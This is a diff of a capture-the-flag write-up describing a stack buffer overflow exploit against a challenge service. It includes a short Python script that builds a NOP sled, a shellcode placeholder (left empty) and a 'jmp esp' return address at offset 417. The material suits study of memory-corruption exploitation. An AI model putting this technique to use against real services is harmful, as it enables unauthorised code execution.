@@ -8,17 +8,18 @@ This challenge was a service reading prompting some data, doing some stuff and t
 There were some `jmp esp` in the file we could use, so we just had to use it to jump in the stack and execute our shellcode. $esp wasn't pointing to the buffer, but by writing a nop slope and then the shellcode right before the return adresse, a jump on $esp would lead to our shellcode.
 
 The exploit script was:
-```
+
+```python
+
 #!/usr/bin/env python
 
 from struct import pack
 shellcode = ""
 
-def exploitffe4():
-  ret_off = 417
-  off_send = pack("I", 0x080DE74F) # jmp esp location
-  payload = '\x90' * (ret_off - len(shellcode)) + shellcode + off_send
-  print(payload)
+ret_off = 417
+off_send = pack("I", 0x080DE74F) # jmp esp location
+payload = '\x90' * (ret_off - len(shellcode)) + shellcode + off_send
+print(payload)
 
-exploitffe4()
+
 ```
